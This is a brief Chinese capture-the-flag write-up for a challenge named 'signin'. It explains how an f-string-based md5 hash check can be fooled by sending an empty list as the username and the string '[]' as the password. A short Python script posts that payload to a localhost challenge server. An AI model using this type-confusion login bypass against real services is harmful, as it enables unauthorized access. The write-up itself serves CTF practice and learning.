- 只做难题
- # signin
	- signin(确信)
	- gethash函数的缺陷
		- 观察发现gethash函数在传入用户名和密码都为`admin`时会输出0
		- 我们只需要让`hashed = gethash(params.get("username"),params.get("password"))`也为0即可
		- 需要计算出`md5(f"{salt}[{username}]{salt}")^md5(f"{salt}[{password}]{salt}")`为0时用户名和密码为多少
		- 其计算时使用了f-string, 输入无论是什么类型都会被转换成字符串
	- 登陆的限制
		- 用户名不能为admin
		- 用户名不能和密码相等
	- 注意到用户名和密码都在一个JSON内，可以为字符串或列表
	- 所以只需要让用户名为空列表，密码为字符串`"[]"`即可获得flag
	- ```python
	  url = "http://localhost:43987/"
	  
	  def encode(s):
	      for _ in range(5):
	          s = enc_dec.base64_encode(s)
	      return s
	  
	  r = base_post(url + "login", json = {
	      "params": encode(json.dumps({
	          "username": [],
	          "password": "[]"
	      }))
	  })
	  print(r.text)
	  ```